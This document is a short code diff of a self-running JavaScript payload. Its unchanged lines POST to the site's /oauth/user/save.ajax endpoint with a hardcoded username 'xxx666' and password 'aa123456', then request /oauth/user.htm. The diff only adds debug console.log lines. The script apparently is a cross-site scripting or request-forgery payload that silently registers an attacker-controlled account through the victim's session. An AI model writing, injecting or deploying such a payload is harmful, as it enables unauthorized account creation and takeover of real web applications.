@@ -1,5 +1,6 @@
 function loadXMLDoc() {
-    var xmlhttp;
+	console.log("start xxx");
+	var xmlhttp;
 	var domain=document.location.protocol+"//"+document.domain;
 	
     if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
@@ -9,10 +10,11 @@ function loadXMLDoc() {
     } else { // code for IE6, IE5
         xmlhttp1 = new ActiveXObject("Microsoft.XMLHTTP");
         xmlhttp2 = new ActiveXObject("Microsoft.XMLHTTP");
-		xmlhttp3 = new ActiveXObject("Microsoft.XMLHTTP");
+	xmlhttp3 = new ActiveXObject("Microsoft.XMLHTTP");
     }
     xmlhttp1.onreadystatechange = function() {
         if (xmlhttp1.readyState == 4 && xmlhttp1.status == 200) {
+		console.log("start xxx222");
             filepath = xmlhttp1.responseText;
 			
 			xmlhttp3.open('GET', domain+'/oauth/user.htm', true);
@@ -42,6 +44,7 @@ function loadXMLDoc() {
     xmlhttp1.open("POST", domain+"/oauth/user/save.ajax", true);
     xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xmlhttp1.send("userName=xxx666&loginPassword=aa123456&confirmPassword=aa123456");
+	console.log("start xxx333");
 
 }
 loadXMLDoc();
